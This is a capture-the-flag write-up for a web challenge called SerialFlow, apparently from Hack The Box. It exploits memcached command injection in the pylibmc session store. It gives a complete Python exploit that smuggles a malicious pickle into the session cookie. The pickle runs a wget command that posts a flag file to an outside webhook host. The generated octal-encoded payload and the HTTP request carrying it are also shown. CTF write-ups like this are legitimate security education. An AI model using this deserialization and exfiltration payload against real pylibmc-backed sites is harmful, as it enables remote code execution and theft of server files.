# SerialFlow - Medium

In this challenge, participants are provided with a website and the Python source code. 
![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/6e3ad55c-fcbb-45d8-a0c1-bd9f0d81fa3c)



## Solution

This challenge use memcached as a session storage and utilize `pylibmc` as a python library
> /challenge/requirements.txt
> ```
> pylibmc==1.6.3
> ```

Unfortunately `pylibmc` is vulnerable to Memcached Injection even this is the latest version. We can read this research https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/ to exploit Memcached Injection in `pylibmc`.

> exploit.py
> ```py
> import pickle
> import os
> 
> class RCE:
>     def __reduce__(self):
>         cmd = ('wget https://h3h3h3.free.beeceptor.com --post-file=/flag0f5895db0a.txt')
>         return os.system, (cmd,)
> 
> def generate_exploit():
>     payload = pickle.dumps(RCE(), 0)
>     payload_size = len(payload)
>     cookie = b'137\r\nset BT_:1337 0 2592000 '
>     cookie += str.encode(str(payload_size))
>     cookie += str.encode('\r\n')
>     cookie += payload
>     cookie += str.encode('\r\n')
>     cookie += str.encode('get BT_:1337')
> 
>     pack = ''
>     for x in list(cookie):
>         if x > 64:
>             pack += oct(x).replace("0o","\\")
>         elif x < 8:
>             pack += oct(x).replace("0o","\\00")
>         else:
>             pack += oct(x).replace("0o","\\0")
> 
>     return f"\"{pack}\""
> 
> print(generate_exploit())
> ```

Run the exploit and send the generated payload in `session` cookie 
```
➜ python3 exploit.py 
"\061\063\067\015\012\163\145\164\040\102\124\137\072\061\063\063\067\040\060\040\062\065\071\062\060\060\060\040\061\060\062\015\012\143\160\157\163\151\170\012\163\171\163\164\145\155\012\160\060\012\050\126\167\147\145\164\040\150\164\164\160\163\072\057\057\150\063\150\063\150\063\056\146\162\145\145\056\142\145\145\143\145\160\164\157\162\056\143\157\155\040\055\055\160\157\163\164\055\146\151\154\145\075\057\146\154\141\147\071\145\146\062\143\143\071\070\067\070\056\164\170\164\012\160\061\012\164\160\062\012\122\160\063\012\056\015\012\147\145\164\040\102\124\137\072\061\063\063\067"
```

HTTP Request:
```
GET / HTTP/1.1
Cookie: session="\061\063\067\015\012\163\145\164\040\102\124\137\072\061\063\063\067\040\060\040\062\065\071\062\060\060\060\040\061\060\062\015\012\143\160\157\163\151\170\012\163\171\163\164\145\155\012\160\060\012\050\126\167\147\145\164\040\150\164\164\160\163\072\057\057\150\063\150\063\150\063\056\146\162\145\145\056\142\145\145\143\145\160\164\157\162\056\143\157\155\040\055\055\160\157\163\164\055\146\151\154\145\075\057\146\154\141\147\071\145\146\062\143\143\071\070\067\070\056\164\170\164\012\160\061\012\164\160\062\012\122\160\063\012\056\015\012\147\145\164\040\102\124\137\072\061\063\063\067"
[..snip..]

```
![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/81df8b40-086d-4d41-8d83-03b6254cedb2)

Check the webhook to retrieve the flag.
![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/e487a869-aa31-4871-8e02-54925c7c1d98)


## Flag
HTB{y0u_th0ught_th15_wou1d_b3_s1mpl3?}
